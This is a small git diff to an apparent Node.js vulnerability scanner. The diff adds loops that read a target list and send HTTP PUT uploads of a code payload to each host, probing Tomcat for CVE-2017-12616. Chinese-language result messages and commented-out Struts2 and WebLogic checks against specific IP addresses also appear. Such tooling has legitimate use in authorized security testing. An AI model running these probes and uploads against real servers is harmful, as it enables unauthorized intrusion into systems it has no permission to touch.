@@ -1428,8 +1428,9 @@ function fnMyPut(url)
 	{
 		request.put({"uri":u,"body":szCode},function(e,r,b)
 		{
+			if(e);//console.log(e);
 			// console.log([u,r.statusCode,r.headers["location"],e||b]);
-			if(201 == r.statusCode || 204 == r.statusCode)
+			else if(r && (201 == r.statusCode || 204 == r.statusCode))
 			{
 				var oT = g_oRst["tomcat"] || {};
 				oT["CVE-2017-12616"] = "发现高危put CVE-2017-12616漏洞,可访" + u + "问进行测试";
@@ -1485,7 +1486,10 @@ process.on('exit', (code) =>
 if(program.test)
 {
 	console.log("开始内网测试");
-	checkWeblogicT3("125.71.203.122","9088");
+	var a = fs.readFileSync("/Users/xiatian/C/targets.txt").toString().split(/\n/);
+	for(var i in a)
+		fnMyPut(a[i].trim());
+	// checkWeblogicT3("125.71.203.122","9088");
 	// doStruts2_016("http://192.168.10.216:8088/S2-016/default.action");
  	
 	// doStruts2_005("http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
